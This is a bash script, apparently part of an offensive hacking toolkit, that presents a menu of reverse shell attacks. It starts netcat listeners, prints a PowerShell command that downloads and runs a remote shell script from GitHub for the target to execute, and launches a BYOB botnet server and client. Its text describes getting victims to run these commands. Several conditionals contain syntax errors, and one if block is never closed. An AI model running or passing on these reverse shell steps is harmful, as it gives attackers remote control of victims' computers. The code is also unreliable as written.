#! /bin/bash

echo "
                                       (((                                      
                                 /...%@@@@@#...,                                
                             /...@@@@@@@@@@@@@@@...(                            
                         *../@@@@@@@@@@@@@@@@@@@@@@@,..*                        
                     ...(@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*..,                    
                ,...%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(..,,               
            (...@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&...(           
        ,..*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&,..,       
      #..@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@..      
     *./@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&*..(..     
     ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@..........(    
     ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&..............(    
     ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@..................(    
     ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%......................(    
     ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&..........................(    
     ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..............................(    
     ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*.................................(    
     ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@...................................(    
     ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#.........@@........................(    
     ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#.........@@@@......................(    
     ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#.......@@(.........................(    
     ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#......@@/..........................(    
     ,.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#......@@@@@@@@.....................(    
     ,.(@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#...........&@@.....................     
      (..@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#...........@@,......,***..........      
        ,../@@@@@@@@@@@@@@@@@@@@@@@@@@@#......@@@@@&.....***............,       
            /...@@@@@@@@@@@@@@@@@@@@@@@#.........@@.................(           
                ....&@@@@@@@@@@@@@@@@@@#........................,               
                    (...&@@@@@@@@@@@@@@#....................                    
                        ,,..(@@@@@@@@@@#...............*                        
                             ,..,@@@@@@%.........../                            
                                 *..,&@@%......,                                
"

echo "You choose the reverse shell attacks section! choose an attack below"
echo "/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/"
echo "NetCat reverse shell LINUX TO LINUX(1)"
echo "----------------------"
echo "NetCat reverse shell LINUX TO WINDOWS POWERSHELL(2)"
echo "----------------------"
echo "BYOB reverse shell attack(3)"
echo "return to main menu(99)"





read SHELLTY
if [[ $SHELLTY == '1']]
then
    echo "install netcat if you haven't already"
    echo "A netcat server will be started on port 8888, all you have to do is to is to get the target to type this command on their machine, check infect media section to create one"
    echo "nc *YOURIPADRESS* 8888"
    sleep 2
    sudo nc -l 8888
fi

if [[ $SHELLTY == '2']]
then
    echo "This will open a netcat server on port 8888, all you have to do is to execute this command on the target's machine, check infect media section"
    echo " IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShe11/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell *YOURIPADRESS* 8888"
    sleep 2
    echo "Please enter your IP Address"
    read HOSTIP
    stty raw -echo; (stty size; cat) | nc -lnvp 8888 -s $HOSTIP
fi




if [[ $SHELLTY == '99']]
then
    cd .. 
    cd ..
    clear 
    ./skt.sh
    bash skt.sh


if [[ $SHELLTY == '3' ]]
then
    cd ..
    cd websiteattacks/byob/byob
    sudo apt install python3-opencv
    sleep 1
    konsole -e python3 setup.py
    sleep 2
    konsole -e python3 server.py
    konsole -e python3 client.py
fi
